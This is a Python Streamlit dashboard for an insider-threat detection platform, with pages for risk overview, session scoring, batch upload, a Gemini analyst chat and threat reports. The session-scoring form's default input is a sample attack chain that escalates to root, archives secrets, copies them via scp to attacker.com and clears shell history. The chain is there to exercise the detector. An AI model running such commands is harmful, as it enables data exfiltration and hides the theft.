"""Streamlit dashboard for the Risk Detection platform."""

import streamlit as st
import requests
import json
import pandas as pd
import plotly.express as px
import plotly.graph_objects as go
from pathlib import Path
import sys
import os

try:
    API_BASE = st.secrets["API_BASE_URL"]
    API_KEY = st.secrets["API_SECRET_KEY"]
except (FileNotFoundError, KeyError):
    # Fallback for local development if secrets.toml isn't set up yet
    API_BASE = "http://localhost:8000"
    API_KEY = os.getenv("API_SECRET_KEY", "")

HEADERS = {
    "Authorization": f"Bearer {API_KEY}",
    "X-API-Key": API_KEY
} if API_KEY else {}


PROJECT_ROOT = Path(__file__).resolve().parent.parent
SRC_DIR = PROJECT_ROOT / "src"
if str(SRC_DIR) not in sys.path:
    sys.path.insert(0, str(SRC_DIR))



st.set_page_config(
    page_title="Insider Threat Detection",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded",
)



st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');

    html, body, [class*="st-"] {
        font-family: 'Inter', sans-serif;
    }

    .main > div { padding-top: 1rem; }

    /* Metric cards */
    .metric-card {
        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        border: 1px solid #0f3460;
        border-radius: 12px;
        padding: 1.2rem;
        text-align: center;
        color: white;
        transition: transform 0.2s;
    }
    .metric-card:hover { transform: translateY(-2px); }
    .metric-value { font-size: 2rem; font-weight: 700; margin: 0.3rem 0; }
    .metric-label { font-size: 0.85rem; color: #8892b0; text-transform: uppercase; letter-spacing: 1px; }

    .risk-critical { border-left: 4px solid #ff4757; }
    .risk-high     { border-left: 4px solid #ff6b35; }
    .risk-medium   { border-left: 4px solid #ffa502; }
    .risk-low      { border-left: 4px solid #2ed573; }

    /* Chat */
    .chat-user {
        background: #0f3460;
        color: white;
        padding: 0.8rem 1rem;
        border-radius: 12px 12px 4px 12px;
        margin: 0.5rem 0;
        max-width: 80%;
        margin-left: auto;
    }
    .chat-assistant {
        background: #1a1a2e;
        color: #ccd6f6;
        padding: 0.8rem 1rem;
        border-radius: 12px 12px 12px 4px;
        margin: 0.5rem 0;
        max-width: 80%;
        border: 1px solid #233554;
    }

    /* Sidebar */
    [data-testid="stSidebar"] {
        background: linear-gradient(180deg, #0a0a23 0%, #1a1a2e 100%);
    }

    .stButton > button {
        background: linear-gradient(135deg, #0f3460 0%, #533483 100%);
        color: white;
        border: none;
        border-radius: 8px;
        padding: 0.5rem 1.5rem;
        font-weight: 500;
        transition: all 0.3s;
    }
    .stButton > button:hover {
        transform: translateY(-1px);
        box-shadow: 0 4px 15px rgba(83, 52, 131, 0.4);
    }

    div[data-testid="stExpander"] {
        border: 1px solid #233554;
        border-radius: 8px;
    }
</style>
""", unsafe_allow_html=True)




def api_call(method, endpoint, timeout=30, **kwargs):
    try:
        url = f"{API_BASE}{endpoint}"
        resp = getattr(requests, method)(url, headers=HEADERS, timeout=timeout, **kwargs)
        resp.raise_for_status()
        return resp.json()
    except requests.exceptions.ConnectionError:
        st.error("⚠️ API server not running. Start it with: `uvicorn api.main:app --reload --port 8000`")
        return None
    except requests.exceptions.ReadTimeout:
        st.error("⚠️ Request timed out. The batch may be too large — try fewer rows or increase timeout.")
        return None
    except requests.exceptions.HTTPError as e:
        st.error(f"API error: {e.response.status_code} — {e.response.text}")
        return None


def risk_badge(level):
    colors = {
        "critical": "#ff4757",
        "high":     "#ff6b35",
        "medium":   "#ffa502",
        "low":      "#2ed573",
    }
    color = colors.get(level, "#8892b0")
    return f'<span style="background:{color};color:white;padding:2px 10px;border-radius:12px;font-size:0.8rem;font-weight:600;">{level.upper()}</span>'




with st.sidebar:
    st.markdown("## 🛡️ Insider Threat")
    st.markdown("##### Detection Dashboard")
    st.divider()

    page = st.radio(
        "Navigation",
        ["📊 Overview", "🔍 Score Session", "📁 Batch Upload", "💬 Analyst Copilot", "📄 Threat Report"],
        label_visibility="collapsed",
    )

    st.divider()


    budget = api_call("get", "/dashboard/budget")
    if budget:
        used = budget["used"]
        limit = budget["limit"]
        pct = used / max(limit, 1) * 100
        st.caption("GenAI Budget")
        st.progress(min(pct / 100, 1.0))
        st.caption(f"{budget['remaining']} / {limit} calls remaining")




if page == "📊 Overview":
    st.markdown("# 📊 Risk Overview")
    st.caption("Risk summary across all scored sessions")


    c1, c2, c3, c4 = st.columns(4)
    stats = api_call("get", "/dashboard/stats")
    if stats:
        with c1:
            st.markdown(f"""<div class="metric-card">
                <div class="metric-label">Total Sessions</div>
                <div class="metric-value">{stats['total_sessions']}</div>
            </div>""", unsafe_allow_html=True)
        with c2:
            st.markdown(f"""<div class="metric-card risk-critical">
                <div class="metric-label">Critical</div>
                <div class="metric-value" style="color:#ff4757">{stats['critical_count']}</div>
            </div>""", unsafe_allow_html=True)
        with c3:
            st.markdown(f"""<div class="metric-card risk-high">
                <div class="metric-label">High</div>
                <div class="metric-value" style="color:#ff6b35">{stats['high_count']}</div>
            </div>""", unsafe_allow_html=True)
        with c4:
            st.markdown(f"""<div class="metric-card risk-low">
                <div class="metric-label">Low / Medium</div>
                <div class="metric-value" style="color:#2ed573">{stats['low_count'] + stats['medium_count']}</div>
            </div>""", unsafe_allow_html=True)
    else:
        st.info("Connect to API to see live stats. Using demo data.")

    st.divider()


    st.subheader("Risk Distribution")
    if stats and stats['total_sessions'] > 0:
        chart_data = pd.DataFrame({
            "Risk Level": ["Low", "Medium", "High", "Critical"],
            "Count": [stats['low_count'], stats['medium_count'], stats['high_count'], stats['critical_count']],
        })
    else:
        chart_data = pd.DataFrame({
            "Risk Level": ["Low", "Medium", "High", "Critical"],
            "Count": [0, 0, 0, 0],
        })
    fig = px.bar(
        chart_data, x="Risk Level", y="Count",
        color="Risk Level",
        color_discrete_map={"Low": "#2ed573", "Medium": "#ffa502", "High": "#ff6b35", "Critical": "#ff4757"},
        template="plotly_dark",
    )
    fig.update_layout(
        plot_bgcolor="rgba(0,0,0,0)",
        paper_bgcolor="rgba(0,0,0,0)",
        showlegend=False,
        height=350,
    )
    st.plotly_chart(fig, use_container_width=True)


    st.subheader("🚨 Top Flagged Sessions")
    top_risks = api_call("get", "/dashboard/top-risks", params={"n": 10})
    if top_risks and len(top_risks) > 0:
        top_df = pd.DataFrame(top_risks)
        display_cols = [c for c in ["user_id", "session_id", "final_risk", "risk_level", "anomaly_score", "sequence_score", "rule_score", "triggered_rules"] if c in top_df.columns]
        st.dataframe(top_df[display_cols], use_container_width=True)
    else:
        st.info("No scored sessions yet. Upload a batch or score a session to see data here.")




elif page == "🔍 Score Session":
    st.markdown("# 🔍 Score a Session")
    st.caption("Enter session details for risk assessment")

    with st.form("score_form"):
        col1, col2 = st.columns(2)
        with col1:
            user_id = st.text_input("User ID", value="AJF0370")
            date = st.text_input("Date", value="2010-06-15")
            after_hours = st.selectbox("After Hours?", [0, 1], index=1)
            login_count = st.number_input("Login Count", value=12, min_value=0)
        with col2:
            devices = st.number_input("Unique Devices", value=4, min_value=0)
            bytes_transferred = st.number_input("Bytes Transferred", value=2_500_000_000, min_value=0)
            cmd_count = st.number_input("Command Count", value=5, min_value=0)
            duration = st.number_input("Session Duration (s)", value=3600, min_value=0)

        command_seq = st.text_area(
            "Command Sequence (separated by ->)",
            value="sudo su -> find / -name *.db -> tar czf /tmp/dump.tar.gz /data/secrets -> scp /tmp/dump.tar.gz attacker.com:/loot/ -> history -c",
            height=80,
        )

        submitted = st.form_submit_button("🔍 Analyze Session", use_container_width=True)

    if submitted:
        session_data = {
            "session_id": f"manual-{user_id}",
            "user_id": user_id,
            "date": date,
            "after_hours": after_hours,
            "after_hours_activity": after_hours,
            "login_count": login_count,
            "unique_devices_used": devices,
            "total_bytes_transferred": bytes_transferred,
            "command_sequence": command_seq,
            "command_count": cmd_count,
            "session_duration_s": duration,
        }

        with st.spinner("Scoring session..."):
            result = api_call("post", "/score", json=session_data)

        if result:
            st.divider()


            c1, c2, c3, c4 = st.columns(4)
            c1.metric("Anomaly Score", f"{result['anomaly_score']:.2f}")
            c2.metric("Sequence Score", f"{result['sequence_score']:.2f}")
            c3.metric("Rule Score", f"{result['rule_score']:.2f}")
            c4.metric("Final Risk", f"{result['final_risk']:.2f}")

            st.markdown(f"**Risk Level:** {risk_badge(result['risk_level'])} &nbsp; **Confidence:** {result['confidence']:.0%}", unsafe_allow_html=True)


            if result.get("triggered_rules"):
                st.warning(f"⚠️ Triggered Rules: {', '.join(result['triggered_rules'])}")


            if result.get("explanation"):
                st.divider()
                st.subheader("Risk Explanation")
                exp = result["explanation"]
                st.markdown(f"**Threat Category:** {exp.get('threat_category', 'N/A')}")
                st.markdown(f"**Severity:** {exp.get('severity', 'N/A')}")
                st.markdown(f"**Likely Intent:** {exp.get('likely_intent', 'N/A')}")
                st.markdown(f"**Confidence Reasoning:** {exp.get('confidence_reasoning', 'N/A')}")
                if exp.get("recommended_actions"):
                    st.markdown("**Recommended Actions:**")
                    for i, action in enumerate(exp["recommended_actions"], 1):
                        st.markdown(f"  {i}. {action}")


            st.session_state["last_result"] = result
            st.session_state["last_session"] = session_data




elif page == "📁 Batch Upload":
    st.markdown("# 📁 Batch Risk Scoring")
    st.caption("Upload a CSV to score all sessions at once")

    uploaded = st.file_uploader("Upload session CSV", type=["csv"])

    if uploaded:
        df = pd.read_csv(uploaded)
        st.markdown(f"**Loaded {len(df)} sessions**")
        st.dataframe(df.head(), use_container_width=True)

        if st.button("🚀 Score All Sessions", use_container_width=True):
            with st.spinner(f"Scoring {len(df)} sessions (this may take a few minutes)..."):
                result = api_call("post", "/batch", timeout=300, files={"file": uploaded.getvalue()})

            if result:
                scored_df = pd.DataFrame(result)
                st.success(f"✅ Scored {len(scored_df)} sessions")


                if "risk_level" in scored_df.columns:
                    counts = scored_df["risk_level"].value_counts()
                    fig = px.pie(
                        values=counts.values, names=counts.index,
                        color=counts.index,
                        color_discrete_map={"low": "#2ed573", "medium": "#ffa502", "high": "#ff6b35", "critical": "#ff4757"},
                        template="plotly_dark",
                        title="Risk Distribution",
                    )
                    fig.update_layout(paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="rgba(0,0,0,0)")
                    st.plotly_chart(fig, use_container_width=True)

                st.dataframe(scored_df, use_container_width=True)


                csv = scored_df.to_csv(index=False)
                st.download_button("📥 Download Scored CSV", csv, "scored_sessions.csv", "text/csv")




elif page == "💬 Analyst Copilot":
    st.markdown("# 💬 Analyst Copilot")
    st.caption("Ask questions about flagged sessions — powered by Gemini")


    if "chat_history" not in st.session_state:
        st.session_state.chat_history = []


    risk_ctx = None

    source = st.radio("Load session from:", ["Last scored session", "Database (all scored sessions)"], horizontal=True)

    if source == "Database (all scored sessions)":
        sessions = api_call("get", "/dashboard/top-risks", params={"n": 50})
        if sessions and len(sessions) > 0:
            options = [
                f"{s.get('user_id', '?')} | {s.get('session_id', '?')} | Risk: {s.get('final_risk', 0):.2f} ({s.get('risk_level', '?')})"
                for s in sessions
            ]
            selected_idx = st.selectbox("Select a session:", range(len(options)), format_func=lambda i: options[i])
            selected = sessions[selected_idx]
            risk_ctx = {
                "anomaly_score":   selected.get("anomaly_score", 0),
                "sequence_score":  selected.get("sequence_score", 0),
                "rule_score":      selected.get("rule_score", 0),
                "final_risk":      selected.get("final_risk", 0),
                "risk_level":      selected.get("risk_level", ""),
                "triggered_rules": selected.get("triggered_rules", []),
                "user_id":         selected.get("user_id", ""),
                "session_id":      selected.get("session_id", ""),
            }

            if isinstance(selected.get("session_data"), dict):
                risk_ctx.update(selected["session_data"])

            st.success(f"🔗 Loaded: **{risk_ctx.get('user_id')}** | Risk: {risk_ctx.get('risk_level', '').upper()}")
        else:
            st.warning("No scored sessions in database. Score a session or upload a batch first.")

    elif "last_result" in st.session_state:
        risk_ctx = {
            "anomaly_score":   st.session_state.last_result["anomaly_score"],
            "sequence_score":  st.session_state.last_result["sequence_score"],
            "rule_score":      st.session_state.last_result["rule_score"],
            "final_risk":      st.session_state.last_result["final_risk"],
            "risk_level":      st.session_state.last_result["risk_level"],
            "confidence":      st.session_state.last_result.get("confidence", 0),
            "triggered_rules": st.session_state.last_result["triggered_rules"],
        }
        if "last_session" in st.session_state:
            risk_ctx.update(st.session_state.last_session)
        st.info(f"🔗 Context from last scored session: **{risk_ctx.get('user_id', 'N/A')}**")
    else:
        st.warning("⚠️ No scored session available. Score a session or select from database.")


    if risk_ctx:
        for msg in st.session_state.chat_history:
            if msg["role"] == "user":
                st.markdown(f'<div class="chat-user">🧑 {msg["content"]}</div>', unsafe_allow_html=True)
            else:
                st.markdown(f'<div class="chat-assistant">🤖 {msg["content"]}</div>', unsafe_allow_html=True)

        question = st.chat_input("Ask about this session...")

        if question:
            st.session_state.chat_history.append({"role": "user", "content": question})

            with st.spinner("Thinking..."):
                resp = api_call("post", "/ask", json={
                    "risk_context": risk_ctx,
                    "question": question,
                    "history": st.session_state.chat_history[:-1],
                })

            if resp:
                st.session_state.chat_history.append({"role": "assistant", "content": resp["response"]})
                st.rerun()


    if st.session_state.chat_history:
        if st.button("🗑️ Clear Chat"):
            st.session_state.chat_history = []
            st.rerun()




elif page == "📄 Threat Report":
    st.markdown("# 📄 Threat Report Generator")
    st.caption("Generate an executive + technical threat report for a flagged session")

    if "last_result" in st.session_state and "last_session" in st.session_state:
        result = st.session_state.last_result
        session = st.session_state.last_session

        fused_risk = {
            "anomaly_score": result["anomaly_score"],
            "sequence_score": result["sequence_score"],
            "rule_score": result["rule_score"],
            "final_risk": result["final_risk"],
            "risk_level": result["risk_level"],
            "confidence": result["confidence"],
            "triggered_rules": result["triggered_rules"],
        }

        st.info(f"Session: **{session.get('user_id', 'N/A')}** | Risk: **{result['risk_level'].upper()}**", icon="🔗")

        if st.button("📝 Generate Report", use_container_width=True):
            with st.spinner("Generating threat report via Gemini..."):
                report = api_call("post", "/report", json={
                    "fused_risk": fused_risk,
                    "session_context": session,
                })

            if report:
                st.divider()

                st.subheader("Executive Summary")
                st.markdown(f"> {report.get('executive_summary', 'N/A')}")

                st.subheader("Technical Summary")
                st.markdown(report.get("technical_summary", "N/A"))

                if report.get("recommended_actions"):
                    st.subheader("Recommended Actions")
                    for i, action in enumerate(report["recommended_actions"], 1):
                        st.markdown(f"**{i}.** {action}")

                if report.get("mitre_techniques"):
                    st.subheader("MITRE ATT&CK Techniques")
                    cols = st.columns(len(report["mitre_techniques"]))
                    for i, tech in enumerate(report["mitre_techniques"]):
                        cols[i].code(tech)


                report_md = f"""# Threat Report — {session.get('user_id', 'Unknown')}
**Date:** {session.get('date', 'N/A')}
**Risk Level:** {result['risk_level'].upper()}

## Executive Summary
{report.get('executive_summary', '')}

## Technical Summary
{report.get('technical_summary', '')}

## Recommended Actions
""" + "\n".join(f"- {a}" for a in report.get("recommended_actions", [])) + f"""

## MITRE ATT&CK Techniques
{', '.join(report.get('mitre_techniques', []))}
"""
                st.download_button(
                    "📥 Download Report (Markdown)",
                    report_md,
                    f"threat_report_{session.get('user_id', 'unknown')}.md",
                    "text/markdown",
                )

    else:
        st.warning("⚠️ Score a session first from the **🔍 Score Session** page, then come back here to generate a report.")




st.sidebar.divider()
st.sidebar.caption("Insider Threat Detection v1.0")
st.sidebar.caption("ML + GenAI Risk Analysis")
